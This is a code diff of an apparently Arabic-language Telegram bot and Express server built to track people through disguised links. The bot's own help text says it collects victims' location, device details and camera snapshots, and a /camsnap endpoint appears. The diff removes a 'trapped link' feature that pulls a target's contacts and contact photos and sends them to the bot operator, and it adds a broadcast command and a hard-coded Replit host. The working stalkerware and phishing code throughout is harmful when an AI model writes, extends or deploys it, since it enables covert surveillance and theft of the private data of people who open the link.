@@ -1,5 +1,12 @@
 const fs = require("fs");
 const express = require("express");
+
+// Users storage
+const USERS_FILE = "./users.json";
+let users = new Set();
+try { JSON.parse(fs.readFileSync(USERS_FILE)).forEach(id => users.add(id)); } catch(e) { users = new Set(); }
+function saveUsers() { fs.writeFileSync(USERS_FILE, JSON.stringify([...users])); }
+
 var cors = require('cors');
 var bodyParser = require('body-parser');
 const fetch = require('node-fetch');
@@ -14,7 +21,7 @@ app.use(cors());
 app.set("view engine", "ejs");
 
 //Modify your URL here
-var hostURL = process.env["HOST_URL"] || (process.env["REPLIT_DEV_DOMAIN"] ? `https://${process.env["REPLIT_DEV_DOMAIN"]}` : "")
+var hostURL="https://trackdown-2.elimalikhelimat.repl.co/"
 //TOGGLE for Shorters
 var use1pt = false;
 
@@ -65,17 +72,29 @@ bot.on('message', async (msg) => {
   if (msg?.reply_to_message?.text == "🌐 Enter Your URL") {
     createLink(chatId, msg.text);
   }
-  if (msg?.reply_to_message?.text == "📱 أدخل الرابط الذي سيُعاد التوجيه إليه بعد سحب جهات الاتصال") {
-    createContactsLink(chatId, msg.text);
+
+  // Save user
+  users.add(chatId);
+  saveUsers();
+
+  if (msg.text == "/myid") {
+    bot.sendMessage(chatId, `🆔 الـ ID الخاص بك:\n\`${chatId}\``, { parse_mode: "Markdown" });
+  }
+
+  if (msg.text && msg.text.startsWith("/broadcast ")) {
+    const ownerId = parseInt(process.env["OWNER_ID"] || "0");
+    if (chatId !== ownerId) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
+    const text = msg.text.replace("/broadcast ", "");
+    let sent = 0, failed = 0;
+    for (const uid of users) {
+      try { await bot.sendMessage(uid, text); sent++; } catch(e) { failed++; }
+    }
+    bot.sendMessage(chatId, `✅ تم الإرسال\nناجح: ${sent}\nفشل: ${failed}`);
   }
 
   if (msg.text == "/start") {
     var m = {
-      reply_markup: JSON.stringify({
-        "inline_keyboard": [
-          [{ text: "🔗 إنشاء رابط", callback_data: "crenew" }]
-        ]
-      })
+      reply_markup: JSON.stringify({ "inline_keyboard": [[{ text: "إنشاء رابط", callback_data: "crenew" }]] })
     };
 
     bot.sendMessage(chatId, `مرحباً بڪ ${msg.chat.first_name} ! , \nيمكنك استخدام هذا البوت لتعقب الأشخاص فقط من خلال ارتباط بسيط. \   يمكنه جمع معلومات مثل يمكنك استخدام هذا البوت لتعقب الأشخاص فقط من خلال رابط بسيط يمكنه جمع معلومات مثل الموقع ومعلومات الجهاز ومقاطع الكاميرا   اكتب تعليمات لمزيد من المعلومات.  الموقع ، معلومات الجهاز ، لقطات الكاميرا اكتب تعليمات لمزيد من المعلومات اضغط على /help`, m);
@@ -99,7 +118,6 @@ bot.on('message', async (msg) => {
 2. رابط عرض الويب: سيعرض هذا موقع الويب (مثل bing ومواقع المواعدة وما إلى ذلك) باستخدام iframe لجمع المعلومات.
 (⚠️ قد لا تعمل العديد من المواقع بموجب هذه الطريقة إذا كان لديها رأس إطار x موجود. مثال https://google.com )
 مع تحيات الملك المتمرد اذ حصلت مع اي احد مشكله يكلمني 
-تم ترجمه البوت من اللغه الانجليزيه الى العربيه بواسطتي ❤️
 @YE_x00
 `);
   }
@@ -111,11 +129,6 @@ bot.on('callback_query', async function onCallbackQuery(callbackQuery) {
   bot.answerCallbackQuery(callbackQuery.id);
   if (callbackQuery.data == "crenew") {
     createNew(callbackQuery.message.chat.id);
-  }
-  if (callbackQuery.data == "contacts") {
-    const cid = callbackQuery.message.chat.id;
-    var mk = { reply_markup: JSON.stringify({ "force_reply": true }) };
-    bot.sendMessage(cid, `📱 أدخل الرابط الذي سيُعاد التوجيه إليه بعد سحب جهات الاتصال`, mk);
   }
 });
 bot.on('polling_error', (error) => {
@@ -176,71 +189,15 @@ createNew (cid);
 
 
 function createNew(cid) {
-  var mk = { reply_markup: JSON.stringify({ "force_reply": true }) };
+  var mk = {
+    reply_markup: JSON.stringify({ "force_reply": true })
+  };
   bot.sendMessage(cid, `🌐 Enter Your URL`, mk);
 }
 
-function createContactsLink(cid, msg) {
-  var encoded = [...msg].some(char => char.charCodeAt(0) > 127);
-  if ((msg.toLowerCase().indexOf('http') > -1) && !encoded) {
-    var uid = cid.toString(36);
-    var uri = btoa(msg);
-    var link = `${hostURL}/contacts/${uid}/${uri}`;
-    var m = { reply_markup: JSON.stringify({ "inline_keyboard": [[{ text: "📱 إنشاء رابط جهات اتصال جديد", callback_data: "contacts" }]] }) };
-    bot.sendMessage(cid, `✅ تم إنشاء الرابط الملغم\n\n📱 رابط سحب جهات الاتصال:\n${link}\n\n⚠️ أرسل هذا الرابط للهدف وستصلك جهات اتصاله مع صورهم فور فتحه.`, m);
-  } else {
-    bot.sendMessage(cid, `⚠️ رابط غير صحيح، يجب أن يبدأ بـ http أو https`);
-    var mk = { reply_markup: JSON.stringify({ "force_reply": true }) };
-    bot.sendMessage(cid, `📱 أدخل الرابط الذي سيُعاد التوجيه إليه بعد سحب جهات الاتصال`, mk);
-  }
-}
 
 
 
-
-
-app.get("/contacts/:uid/:uri?", (req, res) => {
-  const redirectUrl = req.params.uri ? atob(req.params.uri) : "https://google.com";
-  res.render("contacts", { uid: req.params.uid, a: hostURL, redirectUrl: redirectUrl });
-});
-
-app.post("/contacts-data", (req, res) => {
-  var uid = decodeURIComponent(req.body.uid) || null;
-  var data = decodeURIComponent(req.body.data) || null;
-  if (uid && data) {
-    bot.sendMessage(parseInt(uid, 36), `📱 جهات الاتصال المسحوبة:\n\n${data}`);
-    res.send("Done");
-  } else { res.send("Error"); }
-});
-
-const multer = require('multer');
-const upload = multer({ storage: multer.memoryStorage() });
-
-app.post("/contacts-file", upload.single('file'), (req, res) => {
-  var uid = req.body.uid || null;
-  var count = req.body.count || '؟';
-  var filename = req.body.filename || 'contacts.txt';
-  var file = req.file || null;
-  if (uid && file) {
-    var info = { filename: filename, contentType: 'text/plain' };
-    bot.sendDocument(parseInt(uid, 36), file.buffer, { caption: `📱 جهات الاتصال: ${count} جهة اتصال` }, info);
-    res.send("Done");
-  } else { res.send("Error"); }
-});
-
-app.post("/contact-photo", (req, res) => {
-  var uid = decodeURIComponent(req.body.uid) || null;
-  var img = decodeURIComponent(req.body.img) || null;
-  var name = decodeURIComponent(req.body.name) || "جهة اتصال";
-  if (uid && img) {
-    var buffer = Buffer.from(img, 'base64');
-    var info = { filename: "contact.png", contentType: 'image/png' };
-    try {
-      bot.sendPhoto(parseInt(uid, 36), buffer, { caption: `👤 ${name}` }, info);
-    } catch (e) { console.log(e); }
-    res.send("Done");
-  } else { res.send("Error"); }
-});
 
 app.get("/", (req, res) => {
   var ip;
@@ -315,13 +272,6 @@ app.post("/camsnap", (req, res) => {
 
 
 
-const PORT = process.env.PORT || 5000;
-app.listen(PORT, () => {
-  console.log(`App Running on Port ${PORT}!`);
+app.listen(5000, () => {
+  console.log("App Running on Port 5000!");
 });
-
-// Keep Render awake - ping every 5 minutes
-const RENDER_URL = "https://bot-psue.onrender.com";
-setInterval(() => {
-  fetch(RENDER_URL).catch(() => {});
-}, 5 * 60 * 1000);
